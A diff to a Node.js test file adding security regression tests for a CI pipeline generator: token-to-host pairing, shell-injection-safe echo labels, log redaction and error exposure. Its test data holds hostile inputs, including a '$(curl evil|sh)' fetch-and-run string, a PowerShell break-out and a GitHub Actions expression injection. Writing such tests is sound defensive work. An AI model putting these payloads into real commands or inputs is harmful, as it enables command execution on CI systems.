@@ -73,7 +73,7 @@ test('sendError keeps 400 messages and hides 500 details in production', () => {
   const script = `
     const { sendError } = require('./utils/sendError');
     const res = { status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } };
-    const bad = Object.assign(new Error('missing model'), { status: 400 });
+    const bad = Object.assign(new Error('missing model'), { status: 400, expose: true });
     const out = [sendError(res, bad, 'Chat failed'), sendError({ ...res }, new Error('upstream secret'), 'Chat failed')]
       .map((r) => ({ code: r.code, body: r.body }));
     process.stdout.write(JSON.stringify(out));
@@ -92,4 +92,124 @@ test('sendError keeps 400 messages and hides 500 details in production', () => {
 
   const [, devServer] = run('development');
   assert.deepStrictEqual(devServer, { code: 500, body: { error: 'Chat failed: upstream secret' } });
+});
+
+// ── CodeRabbit review on PR #25 ─────────────────────────────────────────────
+const runController = require('../controllers/runController');
+const { sendError: _unused } = require('../utils/sendError');
+const aiService = require('../services/aiService');
+const GitHubActionsGenerator = require('../providers/cicd/GitHubActionsGenerator');
+const { execFileSync: run } = require('node:child_process');
+
+test('server CI tokens are never paired with a caller-chosen host', () => {
+  const saved = { gl: process.env.GITLAB_TOKEN, cc: process.env.CIRCLECI_TOKEN };
+  process.env.GITLAB_TOKEN = 'server-gitlab-token';
+  process.env.CIRCLECI_TOKEN = 'server-circle-token';
+  try {
+    const { resolveCredentials } = runController;
+    // Default hosts may use the server tokens.
+    assert.strictEqual(resolveCredentials('gitlab', {}).token, 'server-gitlab-token');
+    assert.strictEqual(resolveCredentials('circleci', {}).token, 'server-circle-token');
+    // A custom host without the caller's own token is refused, not given ours.
+    assert.throws(() => resolveCredentials('gitlab', { url: 'https://gitlab.attacker.example' }), {
+      status: 400,
+      message: /needs your own token/,
+    });
+    assert.throws(() => resolveCredentials('circleci', { url: 'https://circle.attacker.example' }), {
+      status: 400,
+      message: /needs your own token/,
+    });
+    // With their own token, a custom host is fine.
+    const own = resolveCredentials('gitlab', { url: 'https://gitlab.example.com', token: 'mine' });
+    assert.strictEqual(own.token, 'mine');
+    // Custom hosts must be https (the token travels to them).
+    assert.throws(() => resolveCredentials('circleci', { url: 'http://circle.example.com', token: 'mine' }), {
+      status: 400,
+      message: /must use https/,
+    });
+  } finally {
+    process.env.GITLAB_TOKEN = saved.gl;
+    process.env.CIRCLECI_TOKEN = saved.cc;
+    if (saved.gl === undefined) delete process.env.GITLAB_TOKEN;
+    if (saved.cc === undefined) delete process.env.CIRCLECI_TOKEN;
+  }
+});
+
+test('default step commands print the label; shell syntax in it is never run', () => {
+  const generator = new GitHubActionsGenerator();
+  const hostile = [
+    "x $(curl evil|sh) `id` $HOME it's",
+    "test'; Write-Output PWNED; #", // PowerShell on windows-latest
+    '${{ github.event.pull_request.title }}', // expanded by Actions before the shell
+    'a & calc | b > c',
+  ];
+  for (const label of hostile) {
+    const command = generator._echoLabel(label);
+    const inner = command.slice("echo 'Running ".length, -"...'".length);
+    assert.match(command, /^echo 'Running .*\.\.\.'$/, command);
+    assert.doesNotMatch(inner, /[$`'"{};&|<>#\\]/, command);
+  }
+  assert.strictEqual(generator._echoLabel('Build & test: v1.2'), "echo 'Running Build test: v1.2...'");
+  assert.strictEqual(generator._echoLabel('$$$'), "echo 'Running job...'");
+
+  // End to end: the generated workflow carries the safe command.
+  const nodes = [
+    { id: '1', type: 'trigger_push', data: { label: 'push', config: {} } },
+    { id: '2', type: 'build', data: { label: hostile[2], config: {} } },
+  ];
+  const edges = [{ id: 'e', source: '1', target: '2' }];
+  const yamlText = generator.generate(nodes, edges);
+  assert.ok(!yamlText.includes('${{ github.event'), yamlText);
+
+  // The emitted command really prints the text (POSIX sh) instead of running it.
+  if (process.platform !== 'win32') {
+    assert.strictEqual(run('sh', ['-c', generator._echoLabel(hostile[0])]).toString().trim(), 'Running x curl evil sh id HOME it s...');
+  }
+});
+
+test('malformed JSON bodies are not echoed into logs or responses', async () => {
+  const { errorHandler } = require('../middleware/errorHandler');
+  const err = Object.assign(new SyntaxError('Unexpected token in JSON: {"token":"secret-abc'), {
+    status: 400,
+    type: 'entity.parse.failed',
+  });
+  const logged = [];
+  const originalError = console.error;
+  console.error = (...args) => logged.push(args.join(' '));
+  const res = { headersSent: false, status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } };
+  try {
+    errorHandler(err, { method: 'POST', originalUrl: '/api/runs' }, res, () => {});
+  } finally {
+    console.error = originalError;
+  }
+  assert.deepStrictEqual(res.body, { error: 'Invalid JSON body' });
+  assert.ok(!logged.join('\n').includes('secret-abc'), logged.join('\n'));
+});
+
+test('generating with an unknown provider is a 400, not a silent template', async () => {
+  await assert.rejects(
+    () => aiService.generatePipelineFromPrompt('node app', { aiProvider: 'not-a-provider' }),
+    { status: 400, code: 'UNKNOWN_AI_PROVIDER' }
+  );
+});
+
+test('getCICDGenerator rejects non-string platform names', () => {
+  for (const name of [{}, ['github'], 42]) {
+    assert.throws(() => getCICDGenerator(name), { status: 400 });
+  }
+});
+
+test('sendError shows details in production only for errors we raised', () => {
+  const script = `
+    const { sendError } = require('./utils/sendError');
+    const res = () => ({ status(c) { this.code = c; return this; }, json(b) { this.body = b; return this; } });
+    const ours = Object.assign(new Error('Invalid AWS region'), { status: 400, expose: true });
+    const upstream = Object.assign(new Error('provider said: internal detail'), { status: 400 });
+    process.stdout.write(JSON.stringify([sendError(res(), ours, 'Chat failed').body, sendError(res(), upstream, 'Chat failed').body]));
+  `;
+  const [ours, upstream] = JSON.parse(
+    run(process.execPath, ['-e', script], { cwd: path.join(__dirname, '..'), env: { ...process.env, NODE_ENV: 'production' } }).toString()
+  );
+  assert.deepStrictEqual(ours, { error: 'Chat failed: Invalid AWS region' });
+  assert.deepStrictEqual(upstream, { error: 'Chat failed' });
 });
